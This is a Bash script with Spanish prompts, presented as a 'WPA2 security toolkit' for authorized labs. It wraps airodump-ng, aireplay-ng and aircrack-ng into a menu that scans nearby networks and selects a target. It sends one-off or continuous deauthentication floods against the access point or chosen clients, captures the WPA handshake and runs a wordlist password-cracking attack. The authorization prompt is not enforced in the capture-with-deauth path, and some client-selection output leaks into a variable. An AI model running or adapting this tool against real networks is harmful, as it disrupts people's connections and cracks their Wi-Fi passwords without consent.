#!/usr/bin/env bash
# wpa2_toolkit.sh — Toolkit WPA/WPA2/WPA3-Personal para laboratorio autorizado
# Fedora + Panda PAU0D / mt76x2u
#
# Uso:
#   sudo ./wpa2_toolkit.sh -i INTERFACE
#
# Ejemplo:
#   sudo ./wpa2_toolkit.sh -i wlp0s20f0u1
#
# Importante:
#   Úsalo solo en redes propias o laboratorios autorizados.

set -uo pipefail

INTERFACE="wlp0s20f0u1"
SCAN_SECONDS=12
CAPTURE_TIMEOUT=300
CAPTURE_DIR="captures"
REPORT_DIR="reports"

TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_SSID=""
TARGET_PRIVACY=""
TARGET_AUTH=""
TARGET_CIPHER=""
TARGET_POWER=""
TARGET_BEACONS=""

LAST_CAP=""
LAST_FILTERED_CAP=""

BOLD="\033[1m"
DIM="\033[2m"
GREEN="\033[32m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[34m"
CYAN="\033[36m"
MAGENTA="\033[35m"
RESET="\033[0m"

AIRODUMP_PID=""
TMP_DIR=""

trap 'cleanup; exit 130' INT TERM
trap 'cleanup' EXIT

line() {
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

clear_screen() {
    clear
}

title() {
    clear_screen
    line
    echo -e "${BOLD}${CYAN}  $1${RESET}"
    line
}

section() {
    echo ""
    echo -e "${BOLD}${MAGENTA}$1${RESET}"
    echo -e "${DIM}────────────────────────────────────────────────────────────────────────────${RESET}"
}

ok() {
    echo -e "${GREEN}✓${RESET} $1"
}

warn() {
    echo -e "${YELLOW}!${RESET} $1"
}

err() {
    echo -e "${RED}✗${RESET} $1"
}

pause() {
    echo ""
    read -rp "Presiona ENTER para continuar..."
}

cleanup() {
    tput cnorm 2>/dev/null || true

    if [[ -n "${AIRODUMP_PID:-}" ]]; then
        kill "$AIRODUMP_PID" 2>/dev/null || true
        wait "$AIRODUMP_PID" 2>/dev/null || true
        AIRODUMP_PID=""
    fi

    if [[ -n "${TMP_DIR:-}" && -d "$TMP_DIR" ]]; then
        rm -rf "$TMP_DIR" 2>/dev/null || true
        TMP_DIR=""
    fi
}

usage() {
    cat <<EOF
Uso:
  sudo $0 -i INTERFACE [opciones]

Opciones:
  -i, --interface IFACE     Interfaz en modo monitor
  --scan-time SEGUNDOS      Tiempo de escaneo inicial. Default: $SCAN_SECONDS
  -h, --help                Mostrar ayuda

Ejemplo:
  sudo $0 -i wlp0s20f0u1
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -i|--interface)
            INTERFACE="${2:-}"
            shift 2
            ;;
        --scan-time)
            SCAN_SECONDS="${2:-}"
            shift 2
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            err "Opción desconocida: $1"
            usage
            exit 1
            ;;
    esac
done

require_root() {
    if [[ $EUID -ne 0 ]]; then
        err "Ejecuta con sudo:"
        echo "  sudo $0 -i $INTERFACE"
        exit 1
    fi
}

require_deps() {
    local missing=0
    local required=(iw ip awk grep sort sed date airodump-ng aireplay-ng aircrack-ng)

    for cmd in "${required[@]}"; do
        if command -v "$cmd" >/dev/null 2>&1; then
            ok "$cmd instalado"
        else
            err "Falta: $cmd"
            missing=1
        fi
    done

    if [[ "$missing" -eq 1 ]]; then
        echo ""
        echo "Instala dependencias en Fedora:"
        echo "  sudo dnf install aircrack-ng iw iproute procps-ng"
        exit 1
    fi

    if command -v tshark >/dev/null 2>&1; then
        ok "tshark instalado, se podrá generar PCAP filtrado por objetivo"
    else
        warn "tshark no instalado. Opcional:"
        echo "  sudo dnf install wireshark-cli"
    fi
}

validate_interface() {
    if ! iw dev "$INTERFACE" info >/dev/null 2>&1; then
        err "Interfaz '$INTERFACE' no encontrada."
        echo ""
        warn "Interfaces WiFi disponibles:"
        iw dev | awk '/Interface/ {print "  - " $2}'
        exit 1
    fi

    local type
    type="$(iw dev "$INTERFACE" info 2>/dev/null | awk '/type/ {print $2; exit}')"

    if [[ "$type" != "monitor" ]]; then
        err "La interfaz '$INTERFACE' no está en modo monitor. Modo actual: ${type:-N/A}"
        echo ""
        echo "Primero activa modo monitor:"
        echo "  sudo ./activate_monitor.sh $INTERFACE"
        exit 1
    fi
}

get_iface_type() {
    iw dev "$INTERFACE" info 2>/dev/null | awk '/type/ {print $2; exit}'
}

get_iface_mac() {
    iw dev "$INTERFACE" info 2>/dev/null | awk '/addr/ {print $2; exit}'
}

get_iface_channel() {
    iw dev "$INTERFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}'
}

get_iface_frequency() {
    iw dev "$INTERFACE" info 2>/dev/null | awk '
        /channel/ {
            gsub(/[()]/, "", $3)
            print $3 " MHz"
            exit
        }
    '
}

get_iface_txpower() {
    iw dev "$INTERFACE" info 2>/dev/null | awk '/txpower/ {print $2 " " $3; exit}'
}

show_interface_info() {
    printf "%-22s %s\n" "Interfaz:" "$INTERFACE"
    printf "%-22s %s\n" "Modo:" "$(get_iface_type)"
    printf "%-22s %s\n" "MAC:" "$(get_iface_mac)"
    printf "%-22s %s\n" "Canal actual:" "$(get_iface_channel)"
    printf "%-22s %s\n" "Frecuencia actual:" "$(get_iface_frequency)"
    printf "%-22s %s\n" "Potencia TX:" "$(get_iface_txpower)"
}

parse_networks() {
    local csv="$1"

    awk -F',' '
        function trim(s) {
            gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", s)
            return s
        }

        $1 == "BSSID" {
            in_ap = 1
            next
        }

        $1 == "Station MAC" {
            in_ap = 0
        }

        in_ap && $1 ~ /^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$/ {
            bssid = trim($1)
            channel = trim($4)
            privacy = trim($6)
            cipher = trim($7)
            auth = trim($8)
            power = trim($9)
            beacons = trim($10)
            essid = trim($14)

            if (essid == "") {
                essid = "<hidden>"
            }

            printf "%s|%s|%s|%s|%s|%s|%s|%s\n", bssid, channel, power, privacy, cipher, auth, beacons, essid
        }
    ' "$csv" 2>/dev/null
}

parse_clients_for_bssid() {
    local csv="$1"
    local bssid="$2"

    awk -F',' -v target="$bssid" '
        function trim(s) {
            gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", s)
            return s
        }

        $1 == "Station MAC" {
            in_station = 1
            next
        }

        in_station && $1 ~ /^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$/ {
            station = trim($1)
            power = trim($4)
            packets = trim($5)
            probed = trim($7)

            # Columna 6 = BSSID asociado
            associated = trim($6)

            if (tolower(associated) == tolower(target)) {
                printf "%s|%s|%s|%s\n", station, power, packets, probed
            }
        }
    ' "$csv" 2>/dev/null
}

print_network_table() {
    local -n arr="$1"

    printf "%-4s %-19s %-7s %-8s %-14s %-12s %-10s %s\n" \
        "N°" "BSSID" "CANAL" "PWR" "PRIVACY" "AUTH" "CIPHER" "SSID"
    echo "──────────────────────────────────────────────────────────────────────────────────────────────"

    local i=1
    local item bssid channel power privacy cipher auth beacons ssid

    for item in "${arr[@]}"; do
        IFS='|' read -r bssid channel power privacy cipher auth beacons ssid <<< "$item"

        printf "%-4s %-19s %-7s %-8s %-14s %-12s %-10s %s\n" \
            "$i" "$bssid" "$channel" "$power" "$privacy" "$auth" "$cipher" "$ssid"

        i=$((i + 1))
    done
}

scan_networks() {
    title "SCANNER WIFI"

    section "Interfaz"
    show_interface_info

    section "Escaneo"
    warn "Escaneando redes durante $SCAN_SECONDS segundos..."
    warn "Esto escucha redes cercanas, no ataca nada."

    cleanup
    TMP_DIR="$(mktemp -d)"
    local prefix="$TMP_DIR/scan"
    local csv="${prefix}-01.csv"

    airodump-ng --write "$prefix" --output-format csv "$INTERFACE" >/dev/null 2>&1 &
    local scan_pid=$!

    tput civis 2>/dev/null || true

    for ((s=SCAN_SECONDS; s>=1; s--)); do
        echo -ne "Tiempo restante: ${BOLD}${s}s${RESET}   \r"
        sleep 1
    done

    kill "$scan_pid" 2>/dev/null || true
    wait "$scan_pid" 2>/dev/null || true
    tput cnorm 2>/dev/null || true
    echo ""

    if [[ ! -f "$csv" ]]; then
        err "No se generó CSV de escaneo."
        pause
        return 1
    fi

    mapfile -t SCAN_RESULTS < <(parse_networks "$csv" | sort -t'|' -k3,3nr)

    if [[ "${#SCAN_RESULTS[@]}" -eq 0 ]]; then
        err "No se detectaron redes."
        pause
        return 1
    fi

    section "Redes detectadas"
    print_network_table SCAN_RESULTS

    section "Selección"
    read -rp "Selecciona el número de tu red objetivo: " choice

    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        err "Selección inválida."
        pause
        return 1
    fi

    local idx=$((choice - 1))

    if (( idx < 0 || idx >= ${#SCAN_RESULTS[@]} )); then
        err "Número fuera de rango."
        pause
        return 1
    fi

    local selected="${SCAN_RESULTS[$idx]}"
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_POWER TARGET_PRIVACY TARGET_CIPHER TARGET_AUTH TARGET_BEACONS TARGET_SSID <<< "$selected"

    ok "Objetivo seleccionado: $TARGET_SSID / $TARGET_BSSID / canal $TARGET_CHANNEL"

    # Guardamos último CSV para consultar clientes
    LAST_SCAN_CSV="$csv"

    pause
}

show_target_info() {
    title "INFORMACIÓN DEL OBJETIVO"

    if [[ -z "$TARGET_BSSID" ]]; then
        err "Aún no hay objetivo seleccionado."
        pause
        return
    fi

    section "Red objetivo"
    printf "%-22s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-22s %s\n" "BSSID / MAC AP:" "$TARGET_BSSID"
    printf "%-22s %s\n" "Canal:" "$TARGET_CHANNEL"
    printf "%-22s %s\n" "Frecuencia aprox:" "$(channel_to_freq "$TARGET_CHANNEL")"
    printf "%-22s %s\n" "Potencia:" "$TARGET_POWER"
    printf "%-22s %s\n" "Privacidad:" "$TARGET_PRIVACY"
    printf "%-22s %s\n" "Cifrado:" "$TARGET_CIPHER"
    printf "%-22s %s\n" "Autenticación:" "$TARGET_AUTH"
    printf "%-22s %s\n" "Beacons:" "$TARGET_BEACONS"

    section "Interpretación rápida"

    if echo "$TARGET_PRIVACY $TARGET_AUTH" | grep -qi "WPA3"; then
        warn "La red anuncia WPA3. Si está en modo WPA3/WPA2 mixto, puede haber handshake WPA2 para clientes legacy."
    fi

    if echo "$TARGET_AUTH" | grep -qi "SAE"; then
        warn "SAE corresponde a WPA3-Personal. Aircrack clásico no crackea SAE igual que WPA2-PSK."
    fi

    if echo "$TARGET_AUTH" | grep -qi "PSK"; then
        ok "PSK detectado. Se puede intentar validar/capturar handshake WPA/WPA2-Personal."
    fi

    section "Clientes asociados detectados en último escaneo"

    if [[ -n "${LAST_SCAN_CSV:-}" && -f "$LAST_SCAN_CSV" ]]; then
        mapfile -t CLIENTS < <(parse_clients_for_bssid "$LAST_SCAN_CSV" "$TARGET_BSSID")

        if [[ "${#CLIENTS[@]}" -eq 0 ]]; then
            warn "No se detectaron clientes asociados en el último escaneo."
            echo "Para capturar handshake normalmente necesitas que un cliente se conecte o reconecte."
        else
            printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
            echo "────────────────────────────────────────────────────────────────────────"
            local i=1
            local item station power packets probed

            for item in "${CLIENTS[@]}"; do
                IFS='|' read -r station power packets probed <<< "$item"
                printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
                i=$((i + 1))
            done
        fi
    else
        warn "No hay CSV de escaneo disponible para clientes."
    fi

    section "Última captura"
    if [[ -n "$LAST_CAP" && -f "$LAST_CAP" ]]; then
        echo "$LAST_CAP"
        ls -lh "$LAST_CAP"
    else
        warn "Aún no hay captura registrada."
    fi

    pause
}

channel_to_freq() {
    local ch="$1"

    if [[ "$ch" =~ ^[0-9]+$ ]]; then
        if (( ch >= 1 && ch <= 13 )); then
            echo "$((2407 + ch * 5)) MHz"
        elif (( ch == 14 )); then
            echo "2484 MHz"
        elif (( ch >= 32 )); then
            echo "$((5000 + ch * 5)) MHz"
        else
            echo "N/A"
        fi
    else
        echo "N/A"
    fi
}

set_target_channel() {
    warn "Fijando $INTERFACE en canal $TARGET_CHANNEL..."
    ip link set "$INTERFACE" down 2>/dev/null || true
    iw dev "$INTERFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true
    ip link set "$INTERFACE" up 2>/dev/null || true
    sleep 1
}

has_handshake() {
    local cap="$1"

    if [[ ! -f "$cap" ]]; then
        return 1
    fi

    aircrack-ng -a2 -b "$TARGET_BSSID" "$cap" 2>/dev/null \
        | grep -Eiq "WPA \([1-9][0-9]* handshake|WPA \(.*handshake"
}

filter_target_pcap() {
    local raw_cap="$1"
    local filtered_cap="$2"

    if [[ ! -f "$raw_cap" ]]; then
        return 1
    fi

    if ! command -v tshark >/dev/null 2>&1; then
        return 1
    fi

    tshark -r "$raw_cap" \
        -Y "wlan.addr == ${TARGET_BSSID}" \
        -w "$filtered_cap" >/dev/null 2>&1
}

capture_handshake() {
    local mode="$1"
    local deauth_count="${2:-0}"
    local deauth_every="${3:-10}"
    local deauth_client="${4:-}"

    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
        err "Primero selecciona una red objetivo."
        pause
        return
    fi

    if [[ "$mode" != "passive" ]]; then
        confirm_authorized_action "deauth"
    fi

    mkdir -p "$CAPTURE_DIR" "$REPORT_DIR"

    local clean_bssid timestamp prefix cap csv filtered_cap report
    clean_bssid="${TARGET_BSSID//:/}"
    timestamp="$(date +%Y%m%d_%H%M%S)"
    prefix="${CAPTURE_DIR}/${TARGET_SSID// /_}_${clean_bssid}_ch${TARGET_CHANNEL}_${timestamp}"
    cap="${prefix}-01.cap"
    csv="${prefix}-01.csv"
    filtered_cap="${prefix}_TARGET_ONLY.cap"
    report="${REPORT_DIR}/${TARGET_SSID// /_}_${clean_bssid}_${timestamp}.txt"

    set_target_channel

    title "CAPTURA DE HANDSHAKE"

    section "Objetivo"
    printf "%-22s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-22s %s\n" "BSSID:" "$TARGET_BSSID"
    printf "%-22s %s\n" "Canal:" "$TARGET_CHANNEL"
    printf "%-22s %s\n" "Modo:" "$mode"
    printf "%-22s %s\n" "Archivo:" "$cap"

    section "Captura"
    warn "Airodump se limitará al BSSID objetivo."
    warn "A nivel radio, tu tarjeta puede oír más tráfico del canal, pero se validará contra el BSSID seleccionado."

    airodump-ng \
        --bssid "$TARGET_BSSID" \
        -c "$TARGET_CHANNEL" \
        --write "$prefix" \
        --output-format cap,csv \
        "$INTERFACE" >/dev/null 2>&1 &

    AIRODUMP_PID=$!
    sleep 3

    local start elapsed next_deauth last_action handshake_status
    start="$(date +%s)"
    next_deauth=0
    last_action="Captura iniciada"
    handshake_status="No capturado"

    tput civis 2>/dev/null || true

    while true; do
        elapsed=$(( $(date +%s) - start ))

        if (( elapsed >= CAPTURE_TIMEOUT )); then
            break
        fi

        if [[ -f "$cap" ]] && has_handshake "$cap"; then
            handshake_status="Capturado"
            LAST_CAP="$cap"

            filter_target_pcap "$cap" "$filtered_cap"
            if [[ -f "$filtered_cap" ]]; then
                LAST_FILTERED_CAP="$filtered_cap"
            fi

            break
        fi

        if [[ "$mode" == "finite_deauth" && "$elapsed" -ge 2 && "$next_deauth" -eq 0 ]]; then
            if [[ -n "$deauth_client" ]]; then
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" -c "$deauth_client" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth finito x${deauth_count} al cliente $deauth_client"
            else
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth finito x${deauth_count} al AP objetivo"
            fi
            next_deauth=999999
        fi

        if [[ "$mode" == "loop_deauth" && "$elapsed" -ge "$next_deauth" ]]; then
            if [[ -n "$deauth_client" ]]; then
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" -c "$deauth_client" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth continuo x${deauth_count} al cliente $deauth_client"
            else
                aireplay-ng --deauth "$deauth_count" -a "$TARGET_BSSID" "$INTERFACE" >/dev/null 2>&1 &
                last_action="Deauth continuo x${deauth_count} al AP objetivo"
            fi
            next_deauth=$(( elapsed + deauth_every ))
        fi

        draw_capture_dashboard "$elapsed" "$cap" "$csv" "$last_action" "$handshake_status"
        sleep 2
    done

    tput cnorm 2>/dev/null || true

    kill "$AIRODUMP_PID" 2>/dev/null || true
    wait "$AIRODUMP_PID" 2>/dev/null || true
    AIRODUMP_PID=""

    if [[ -f "$cap" ]]; then
        LAST_CAP="$cap"
    fi

    filter_target_pcap "$cap" "$filtered_cap"
    if [[ -f "$filtered_cap" ]]; then
        LAST_FILTERED_CAP="$filtered_cap"
    fi

    {
        echo "WPA Toolkit Report"
        echo "=================="
        echo "Fecha: $(date)"
        echo "SSID: $TARGET_SSID"
        echo "BSSID: $TARGET_BSSID"
        echo "Canal: $TARGET_CHANNEL"
        echo "Frecuencia: $(channel_to_freq "$TARGET_CHANNEL")"
        echo "Privacy: $TARGET_PRIVACY"
        echo "Cipher: $TARGET_CIPHER"
        echo "Auth: $TARGET_AUTH"
        echo "CAP: $cap"
        echo "Filtered CAP: ${LAST_FILTERED_CAP:-N/A}"
        echo "Handshake: $handshake_status"
    } > "$report"

    title "RESULTADO DE CAPTURA"

    if [[ "$handshake_status" == "Capturado" ]]; then
        echo -e "${GREEN}${BOLD}✓ Handshake capturado para $TARGET_SSID${RESET}"
    else
        echo -e "${RED}${BOLD}✗ No se detectó handshake dentro del tiempo configurado${RESET}"
    fi

    section "Archivos"
    if [[ -f "$cap" ]]; then
        echo "CAP raw:"
        ls -lh "$cap"
    fi

    if [[ -f "$filtered_cap" ]]; then
        echo ""
        echo "CAP filtrado al objetivo:"
        ls -lh "$filtered_cap"
    else
        warn "No se generó CAP filtrado. Instala tshark con:"
        echo "  sudo dnf install wireshark-cli"
    fi

    echo ""
    echo "Reporte:"
    ls -lh "$report"

    section "Siguiente paso"
    if [[ "$handshake_status" == "Capturado" ]]; then
        echo "Puedes lanzar ataque de diccionario desde el menú."
    else
        echo "Recomendaciones:"
        echo "  - Asegúrate de que haya clientes conectados."
        echo "  - Aumenta el timeout."
        echo "  - Usa deauth finito si es tu red/laboratorio."
        echo "  - Usa deauth dirigido a un cliente si lo detectaste."
    fi

    pause
}

draw_capture_dashboard() {
    local elapsed="$1"
    local cap="$2"
    local csv="$3"
    local last_action="$4"
    local handshake_status="$5"

    title "CAPTURA EN PROGRESO"

    section "Objetivo"
    printf "%-24s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-24s %s\n" "BSSID:" "$TARGET_BSSID"
    printf "%-24s %s\n" "Canal objetivo:" "$TARGET_CHANNEL"
    printf "%-24s %s\n" "Frecuencia:" "$(channel_to_freq "$TARGET_CHANNEL")"
    printf "%-24s %s\n" "Handshake:" "$handshake_status"

    section "Interfaz"
    printf "%-24s %s\n" "Interfaz:" "$INTERFACE"
    printf "%-24s %s\n" "Canal actual:" "$(get_iface_channel)"
    printf "%-24s %s\n" "Frecuencia actual:" "$(get_iface_frequency)"
    printf "%-24s %s\n" "Potencia TX:" "$(get_iface_txpower)"

    section "Estado"
    printf "%-24s %ss / %ss\n" "Tiempo:" "$elapsed" "$CAPTURE_TIMEOUT"
    printf "%-24s %s\n" "Última acción:" "$last_action"
    printf "%-24s %s\n" "Archivo CAP:" "$cap"

    section "Clientes del objetivo detectados"
    if [[ -f "$csv" ]]; then
        mapfile -t LIVE_CLIENTS < <(parse_clients_for_bssid "$csv" "$TARGET_BSSID")

        if [[ "${#LIVE_CLIENTS[@]}" -eq 0 ]]; then
            warn "Sin clientes asociados detectados todavía."
        else
            printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
            echo "────────────────────────────────────────────────────────────────────────"

            local i=1
            local item station power packets probed

            for item in "${LIVE_CLIENTS[@]}"; do
                IFS='|' read -r station power packets probed <<< "$item"
                printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
                i=$((i + 1))
            done
        fi
    else
        warn "Esperando CSV..."
    fi

    echo ""
    line
    echo -e "${DIM}Ctrl+C para detener. La captura parcial se conserva.${RESET}"
}


confirm_authorized_action() {
    local action="$1"

    title "CONFIRMACIÓN DE AUTORIZACIÓN"

    warn "La acción '$action' puede interrumpir clientes WiFi temporalmente."
    warn "Continúa solo si es tu red, tu laboratorio o tienes permiso explícito."

    echo ""
    read -rp "Escribe AUTORIZADO para continuar: " confirmation

    if [[ "$confirmation" != "AUTORIZADO" ]]; then
        err "Acción cancelada."
        pause
        return 1
    fi

    return 0
}

select_client_optional() {
    local selected_client=""

    if [[ -z "${LAST_SCAN_CSV:-}" || ! -f "$LAST_SCAN_CSV" ]]; then
        echo ""
        warn "No hay CSV de escaneo reciente para listar clientes."
        echo "Se usará deauth general al AP."
        echo ""
        echo ""
        return 0
    fi

    mapfile -t CLIENTS < <(parse_clients_for_bssid "$LAST_SCAN_CSV" "$TARGET_BSSID")

    if [[ "${#CLIENTS[@]}" -eq 0 ]]; then
        warn "No se detectaron clientes. Se usará deauth general al AP."
        echo ""
        echo ""
        return 0
    fi

    section "Clientes detectados"
    printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
    echo "────────────────────────────────────────────────────────────────────────"

    local i=1
    local item station power packets probed

    for item in "${CLIENTS[@]}"; do
        IFS='|' read -r station power packets probed <<< "$item"
        printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
        i=$((i + 1))
    done

    echo ""
    echo "0 No seleccionar cliente, usar AP general"
    read -rp "Cliente objetivo para deauth [0-${#CLIENTS[@]}]: " choice

    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#CLIENTS[@]} )); then
        local idx=$((choice - 1))
        IFS='|' read -r selected_client _ <<< "${CLIENTS[$idx]}"
        echo "$selected_client"
    else
        echo ""
    fi
}

deauth_only_finite() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona objetivo."
        pause
        return
    fi

    title "DEAUTH FINITO"

    section "Objetivo"
    echo "SSID:  $TARGET_SSID"
    echo "BSSID: $TARGET_BSSID"
    echo "Canal: $TARGET_CHANNEL"

    echo ""
    read -rp "Número de deauths a enviar [10]: " count
    count="${count:-10}"

    if [[ ! "$count" =~ ^[0-9]+$ ]]; then
        err "Número inválido."
        pause
        return
    fi

    local client
    client="$(select_client_optional)"

    confirm_authorized_action "deauth finito" || return

    set_target_channel

    section "Ejecutando"
    if [[ -n "$client" ]]; then
        aireplay-ng --deauth "$count" -a "$TARGET_BSSID" -c "$client" "$INTERFACE"
    else
        aireplay-ng --deauth "$count" -a "$TARGET_BSSID" "$INTERFACE"
    fi

    pause
}

deauth_only_loop() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona objetivo."
        pause
        return
    fi

    title "DEAUTH CONTINUO"

    warn "Esto enviará deauth repetidamente hasta que presiones Ctrl+C."
    warn "Úsalo solo en laboratorio autorizado."

    echo ""
    read -rp "Deauth por ráfaga [5]: " count
    count="${count:-5}"

    read -rp "Intervalo entre ráfagas en segundos [5]: " interval
    interval="${interval:-5}"

    if [[ ! "$count" =~ ^[0-9]+$ || ! "$interval" =~ ^[0-9]+$ ]]; then
        err "Valores inválidos."
        pause
        return
    fi

    local client
    client="$(select_client_optional)"

    confirm_authorized_action "deauth continuo" || return

    set_target_channel

    title "DEAUTH CONTINUO ACTIVO"
    warn "Presiona Ctrl+C para detener."
    echo ""

    while true; do
        if [[ -n "$client" ]]; then
            echo "[*] Enviando deauth x$count a cliente $client..."
            aireplay-ng --deauth "$count" -a "$TARGET_BSSID" -c "$client" "$INTERFACE"
        else
            echo "[*] Enviando deauth x$count al AP objetivo..."
            aireplay-ng --deauth "$count" -a "$TARGET_BSSID" "$INTERFACE"
        fi

        sleep "$interval"
    done
}

verify_handshake() {
    title "VERIFICAR HANDSHAKE"

    local cap="$LAST_CAP"

    if [[ -z "$cap" || ! -f "$cap" ]]; then
        warn "No hay última captura registrada."
        echo ""
        read -rp "Ruta del archivo .cap: " cap
    fi

    if [[ ! -f "$cap" ]]; then
        err "Archivo no encontrado: $cap"
        pause
        return
    fi

    if [[ -z "$TARGET_BSSID" ]]; then
        read -rp "BSSID objetivo: " TARGET_BSSID
    fi

    section "Validando"
    echo "CAP:   $cap"
    echo "BSSID: $TARGET_BSSID"
    echo ""

    aircrack-ng -a2 -b "$TARGET_BSSID" "$cap"

    echo ""

    if has_handshake "$cap"; then
        ok "Handshake detectado para $TARGET_BSSID"
    else
        err "No se detectó handshake para $TARGET_BSSID"
    fi

    pause
}

dictionary_attack() {
    title "ATAQUE DE DICCIONARIO"

    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona objetivo o ingresa BSSID manualmente."
        read -rp "BSSID: " TARGET_BSSID
    fi

    local cap="$LAST_CAP"

    if [[ -z "$cap" || ! -f "$cap" ]]; then
        warn "No hay última captura registrada."
        read -rp "Ruta del archivo .cap: " cap
    fi

    if [[ ! -f "$cap" ]]; then
        err "Archivo no encontrado: $cap"
        pause
        return
    fi

    if ! has_handshake "$cap"; then
        warn "No se detectó handshake en este CAP para $TARGET_BSSID."
        read -rp "¿Deseas continuar igual? [s/N]: " cont
        [[ "$cont" != "s" && "$cont" != "S" ]] && return
    fi

    echo ""
    echo "Ejemplos:"
    echo "  /usr/share/wordlists/rockyou.txt"
    echo "  wordlists/mi_diccionario.txt"
    echo ""
    read -rp "Ruta del diccionario: " wordlist

    if [[ ! -f "$wordlist" ]]; then
        err "Diccionario no encontrado: $wordlist"
        pause
        return
    fi

    section "Ejecutando aircrack-ng"
    echo "SSID:      ${TARGET_SSID:-N/A}"
    echo "BSSID:     $TARGET_BSSID"
    echo "CAP:       $cap"
    echo "Wordlist:  $wordlist"
    echo ""

    aircrack-ng -a2 -b "$TARGET_BSSID" -w "$wordlist" "$cap"

    pause
}

capture_menu() {
    if [[ -z "$TARGET_BSSID" ]]; then
        err "Primero selecciona una red objetivo."
        pause
        return
    fi

    while true; do
        title "TIPO DE CAPTURA / ATAQUE"

        section "Objetivo actual"
        echo "SSID:  $TARGET_SSID"
        echo "BSSID: $TARGET_BSSID"
        echo "Canal: $TARGET_CHANNEL"
        echo "Auth:  $TARGET_AUTH"
        echo "Enc:   $TARGET_PRIVACY / $TARGET_CIPHER"

        section "Opciones"
        echo "1. Captura pasiva de handshake"
        echo "2. Captura handshake + deauth finito"
        echo "3. Captura handshake + deauth continuo hasta handshake/timeout"
        echo "4. Solo deauth finito"
        echo "5. Solo deauth continuo hasta Ctrl+C"
        echo "0. Volver"

        echo ""
        read -rp "Selecciona opción: " opt

        case "$opt" in
            1)
                read -rp "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                CAPTURE_TIMEOUT="${t:-$CAPTURE_TIMEOUT}"
                capture_handshake "passive"
                ;;
            2)
                read -rp "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                CAPTURE_TIMEOUT="${t:-$CAPTURE_TIMEOUT}"

                read -rp "Número de deauths [10]: " count
                count="${count:-10}"

                local client
                client="$(select_client_optional)"

                capture_handshake "finite_deauth" "$count" 10 "$client"
                ;;
            3)
                read -rp "Timeout de captura en segundos [$CAPTURE_TIMEOUT]: " t
                CAPTURE_TIMEOUT="${t:-$CAPTURE_TIMEOUT}"

                read -rp "Deauth por ráfaga [5]: " count
                count="${count:-5}"

                read -rp "Intervalo entre ráfagas en segundos [8]: " every
                every="${every:-8}"

                local client
                client="$(select_client_optional)"

                capture_handshake "loop_deauth" "$count" "$every" "$client"
                ;;
            4)
                deauth_only_finite
                ;;
            5)
                deauth_only_loop
                ;;
            0)
                return
                ;;
            *)
                err "Opción inválida."
                pause
                ;;
        esac
    done
}

main_menu() {
    while true; do
        title "WPA2 SECURITY TOOLKIT — FEDORA"

        section "Interfaz"
        show_interface_info

        section "Objetivo actual"
        if [[ -n "$TARGET_BSSID" ]]; then
            echo -e "${GREEN}${BOLD}$TARGET_SSID${RESET}"
            echo "BSSID: $TARGET_BSSID"
            echo "Canal: $TARGET_CHANNEL"
            echo "Auth:  $TARGET_AUTH"
            echo "Enc:   $TARGET_PRIVACY / $TARGET_CIPHER"
        else
            warn "No hay objetivo seleccionado."
        fi

        section "Menú"
        echo "1. Escanear redes y seleccionar objetivo"
        echo "2. Ver información completa del objetivo"
        echo "3. Captura / ataque"
        echo "4. Verificar handshake en CAP"
        echo "5. Ataque de diccionario"
        echo "6. Cambiar timeout de captura"
        echo "0. Salir"

        echo ""
        read -rp "Selecciona opción: " opt

        case "$opt" in
            1)
                scan_networks
                ;;
            2)
                show_target_info
                ;;
            3)
                capture_menu
                ;;
            4)
                verify_handshake
                ;;
            5)
                dictionary_attack
                ;;
            6)
                echo ""
                read -rp "Nuevo timeout en segundos: " t
                if [[ "$t" =~ ^[0-9]+$ ]]; then
                    CAPTURE_TIMEOUT="$t"
                    ok "Timeout actualizado a ${CAPTURE_TIMEOUT}s"
                else
                    err "Valor inválido."
                fi
                pause
                ;;
            0)
                cleanup
                clear
                exit 0
                ;;
            *)
                err "Opción inválida."
                pause
                ;;
        esac
    done
}

main() {
    title "INICIALIZANDO WPA2 TOOLKIT"

    section "Validaciones"
    require_root
    require_deps
    validate_interface

    mkdir -p "$CAPTURE_DIR" "$REPORT_DIR" wordlists

    ok "Entorno listo"
    pause

    main_menu
}

main
